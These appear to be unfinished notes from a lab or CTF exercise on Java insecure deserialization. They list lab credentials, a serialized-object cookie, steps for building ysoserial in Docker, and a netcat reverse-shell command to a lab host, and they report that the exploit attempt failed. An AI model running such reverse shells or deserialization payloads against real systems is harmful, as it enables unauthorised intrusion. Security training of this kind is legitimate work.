# Insecure Serialization




## Answers


## Steps


**1user  Analyze insecure/serialization website**
Insecure/deserialization credentials
thomas
mypass22


Cookie values: 
- JSESSIONID:"80D9B52D7F671CC3B97B43C985F9A8CC"
- user:"rO0ABXNyAB9uZXQuaXNjaGkuaGwuc2VyaWFsaXphdGlvbi5Vc2VyAAAAAAAAAAECAAJMAAhwYXNzd29yZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHB0AAZ0aG9tYXM="
    - seems to be java serialization code (starting with "rO0")


**2 exploit**
Running ysoserial reverse shell
1. get ysoserial from github
```
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
```
2. fix dockerfile according to: https://github.com/frohoff/ysoserial/pull/193
3. run docker
```
docker build -t ysoserial .
docker run ysoserial --help
```


**Reverse shell **
credentials
- username: hacker
- password: 47jOydzxcp0u
10.103.0.6.  Port 1337 or 4242 
`nc 10.103.0.6 1337 -e /bin/sh`
<span style="color:red">creating exploit not working.. java installation problem
    
    TODO check messages: docker file has to be adapted manually 
       </span>